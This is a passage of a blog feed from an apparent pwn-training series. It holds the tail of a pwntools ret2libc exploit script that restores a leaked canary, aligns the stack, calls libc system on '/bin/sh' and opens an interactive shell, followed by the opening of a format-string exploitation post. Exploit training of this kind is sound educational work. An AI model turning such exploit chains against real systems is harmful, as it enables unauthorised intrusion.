+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# fill the buffer till the canary and overwrite the canary with real one.
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0000000000001016&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# random garbage to fill the rbp
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00000000000012cb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# return address
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/bin/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# find the address of libc bin/sh
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/bin/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0000000000001016&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# return to make sure stack is aligned before a glibc call
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sym&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# call system.
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Missed again??? I'm so disappointed.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hope you loved this challenge in the training !! :D&lt;/p&gt;</content><author><name>tourpran</name></author><category term="pwn-training" /><category term="libc leak" /><category term="ret2libc" /><summary type="html"></summary></entry><entry><title type="html">Format String Exploitation</title><link href="http://tourpran.me/pwn-training/2021/05/20/format-string-exploitation-training2.html" rel="alternate" type="text/html" title="Format String Exploitation" /><published>2021-05-20T00:00:00+05:30</published><updated>2021-05-20T00:00:00+05:30</updated><id>http://tourpran.me/pwn-training/2021/05/20/format-string-exploitation-training2</id><content type="html" xml:base="http://tourpran.me/pwn-training/2021/05/20/format-string-exploitation-training2.html">&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining2/pwntrain13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;introduction&quot;&gt;Introduction:&lt;/h3&gt;
 
